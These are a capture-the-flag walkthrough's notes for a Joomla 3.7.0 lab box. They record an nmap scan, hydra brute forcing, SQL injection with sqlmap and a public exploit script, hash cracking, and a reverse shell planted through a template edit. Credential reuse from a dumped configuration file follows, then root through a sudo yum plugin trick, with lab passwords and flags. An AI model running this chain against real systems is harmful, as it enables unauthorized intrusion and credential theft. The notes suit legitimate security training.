@@ -1,0 +1,248 @@
+# daily bugle
+
+sudo nmap -sV -vv -sC $IP
+
+ORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
+|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
+80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
+|_http-generator: Joomla! - Open Source Content Management
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+3306/tcp open  mysql   syn-ack ttl 61 MariaDB (unauthorized)
+
+
+#Spiderman robbed the bank
+
+#Trying Hydra
+
+# username=USER&password=PASS&Submit=&option=com_users&task=user.login&return=aHR0cDovLzEwLjEwLjE5NC4yMDkv&793272fe710a35629ef61f55d9c35c83=1
+
+hydra -l 'Super User' -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/index.php:username=^USER^&password=^PASS^&Submit=&option=com_users&task=user.login&return=aHR0cDovLzEwLjEwLjE5NC4yMDkv&793272fe710a35629ef61f55d9c35c83=1:Username and password do not match or you do not have an account yet." -vv
+
+#Not much
+
+#using joomscan
+
+joomscan -u http://$IP
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing : 
+http://10.10.194.209/administrator/components
+http://10.10.194.209/administrator/modules
+http://10.10.194.209/administrator/templates
+http://10.10.194.209/images/banners
+
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://10.10.194.209/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is found
+path : http://10.10.194.209/robots.txt 
+
+Interesting path found from robots.txt
+http://10.10.194.209/joomla/administrator/
+http://10.10.194.209/administrator/
+http://10.10.194.209/bin/
+http://10.10.194.209/cache/
+http://10.10.194.209/cli/
+http://10.10.194.209/components/
+http://10.10.194.209/includes/
+http://10.10.194.209/installation/
+http://10.10.194.209/language/
+http://10.10.194.209/layouts/
+http://10.10.194.209/libraries/
+http://10.10.194.209/logs/
+http://10.10.194.209/modules/
+http://10.10.194.209/plugins/                                                                                                                                                                                                                
+http://10.10.194.209/tmp/                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                             
+[+] Finding common backup files name                                                                                                                                                                                                         
+^C[++]                                                                                                                                                                                                                                       
+Shutting Down , Interrupt by user                                                                                                                                                                                                            
+                                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                             
+Your Report : reports/10.10.194.209/ 
+
+
+
+https://www.exploit-db.com/exploits/42033
+
+sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+
+https://www.exploit-db.com/exploits/44227
+
+
+https://github.com/NinjaJc01/joomblah-3
+
+python joomblah.py http://$IP
+
+[-] Fetching CSRF token
+ [-] Testing SQLi
+('  -  Found table:', 'fb9j5_users')
+('  -  Extracting users from', 'fb9j5_users')
+(' [$] Found user', ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', ''])
+('  -  Extracting sessions from', 'fb9j5_session')
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --fork=16
+
+#username: jonah
+#password: spiderman123
+
+# same password http://10.10.194.209/administrator/
+
+# going for sqlmap shell
+sqlmap -u "http://$IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --dbms=SQlite --batch --threads=10 --os-shell
+
+# going for https://www.hackingarticles.in/joomla-reverse-shell/
+
+# Wrote over both index.php files of the templates
+
+nc -nlvp 1234
+
+# reload the main page
+
+# new shell
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+cat /va/www/html/configuration.php 
+
+<?php
+class JConfig {
+        public $offline = '0';
+        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+        public $display_offline_message = '1';
+        public $offline_image = '';
+        public $sitename = 'The Daily Bugle';
+        public $editor = 'tinymce';
+        public $captcha = '0';
+        public $list_limit = '20';
+        public $access = '1';
+        public $debug = '0';
+        public $debug_lang = '0';
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'root';
+        public $password = 'nv5uz9r3ZEDzVjNu';
+        public $db = 'joomla';
+        public $dbprefix = 'fb9j5_';
+        public $live_site = '';
+        public $secret = 'UAMBRWzHO3oFPmVC';
+        public $gzip = '0';
+        public $error_reporting = 'default';
+        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
+        public $ftp_host = '127.0.0.1';
+        public $ftp_port = '21';
+        public $ftp_user = '';
+        public $ftp_pass = '';
+        public $ftp_root = '';
+        public $ftp_enable = '0';
+        public $offset = 'UTC';
+        public $mailonline = '1';
+        public $mailer = 'mail';
+        public $mailfrom = 'jonah@tryhackme.com';
+        public $fromname = 'The Daily Bugle';
+        public $sendmail = '/usr/sbin/sendmail';
+        public $smtpauth = '0';
+        public $smtpuser = '';
+        public $smtppass = '';
+        public $smtphost = 'localhost';
+        public $smtpsecure = 'none';
+        public $smtpport = '25';
+        public $caching = '0';
+        public $cache_handler = 'file';
+        public $cachetime = '15';
+        public $cache_platformprefix = '0';
+        public $MetaDesc = 'New York City tabloid newspaper';
+        public $MetaKeys = '';
+        public $MetaTitle = '1';
+        public $MetaAuthor = '1';
+        public $MetaVersion = '0';
+        public $robots = '';
+        public $sef = '1';
+        public $sef_rewrite = '0';
+        public $sef_suffix = '0';
+        public $unicodeslugs = '0';
+        public $feed_limit = '10';
+        public $feed_email = 'none';
+        public $log_path = '/var/www/html/administrator/logs';
+        public $tmp_path = '/var/www/html/tmp';
+        public $lifetime = '15';
+        public $session_handler = 'database';
+        public $shared_session = '0';
+
+
+
+su jjameson
+#password: nv5uz9r3ZEDzVjNu
+
+#user.txt 27a260fe3cba712cfdedb1c86d80442e
+
+sudo -l
+
+# /usr/bin/yum
+
+https://gtfobins.github.io/gtfobins/yum/
+
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+
+
+ls -la
+
+whoami
+
+# root
+
+cd /root
+cat root.txt
+# eec3d53292b1821868266858d7fa6f79
